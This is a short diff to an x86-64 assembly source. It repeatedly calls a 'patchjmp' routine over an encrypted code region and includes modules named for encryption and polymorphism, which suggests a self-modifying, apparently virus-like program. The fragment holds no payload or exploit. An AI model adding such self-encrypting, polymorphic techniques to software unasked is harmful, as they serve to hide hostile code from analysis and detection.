@@ -37,10 +37,35 @@ _start:
 	xor		rdx, rdx
 	call	[rbp]
 
+	lea	rdi, [rel encrypted_start]
+	lea	rsi, [rel _stop]
+
+	call	patchjmp
+	lea	rdi, [rel encrypted_start]
+	lea	rsi, [rel _stop]
+
+	call	patchjmp
+	lea	rdi, [rel encrypted_start]
+	lea	rsi, [rel _stop]
+
+	call	patchjmp
+	lea	rdi, [rel encrypted_start]
+	lea	rsi, [rel _stop]
+
+	call	patchjmp
+
+
+
+
+
 
 %include "encrypt_start.s"
 
+
 %include "end.s"
+
+
+
 
 %include "video.s"
 
@@ -48,7 +73,6 @@ _start:
 %include "polymorph.s"
 %include "print_rax.s"
 %include "printf.s"
-%include "meta.s"
 ; Functions to remove!
 
 _stop:
